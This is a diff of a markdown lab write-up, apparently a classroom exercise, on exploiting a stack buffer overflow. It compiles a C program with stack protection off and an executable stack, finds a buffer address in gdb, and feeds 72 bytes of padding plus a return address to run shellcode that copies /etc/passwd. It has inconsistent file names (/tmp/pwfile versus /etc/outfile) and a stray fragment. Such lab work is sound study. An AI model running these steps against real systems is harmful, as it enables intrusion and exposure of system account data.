@@ -89,13 +89,16 @@ Create a C program that contains a buffer overflow vulnerability
 ```bash
 gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
 ```
+Run by gcc
+- -fno-stack-protector: Disables stack protection.
+- -z execstack: Marks the stack as executabl
 
 ## 3. Create the Assembly Payload
 
 * Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Here’s the assembly code
 
 ```bash
-nano asm_code.c
+nano asm_code.asm
 ```
 ![image](https://github.com/user-attachments/assets/d431ef63-ede5-4b1c-ad05-3e1ba676f77f)
 
@@ -118,7 +121,7 @@ You need to find the address of the `redundant_code` binary in memory. This addr
 
 
 ```bash
- break redundant_code
+break redundant_code
 run $(python -c "print('A'*72)")
 p &buffer
 ```
@@ -132,24 +135,29 @@ Make a note of the address is `0xf7fcc5b4`; you'll use it in the next step.
 
 ## 7. Execute the Vulnerable Program with the Payload
 
-
-
-
 Run the vulnerable program with the crafted payload:
 
 ```bash
 ./redundant_code "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
 ```
 
+Generated a string of 72 'a' characters followed by a byte sequence intended to manipulate the program's execution flow. The output resulted in a "Segmentation fault (core dumped)," confirming the presence of a buffer overflow vulnerability in the redundant_code program.
 
 ## 8. Verify the Output
+
+```bash
+cat /etc/passwd
+```
+
+![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)
+
+this is 
 
 ```bash
 cat /etc/outfile
 ```
 
-![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)
-
+The command cat /etc/passwd is useful for viewing user account information on a Linux or Unix system. 
 
 ![image](https://github.com/user-attachments/assets/56fa25ea-0a95-44ba-a009-1a78bd406e6a)
 
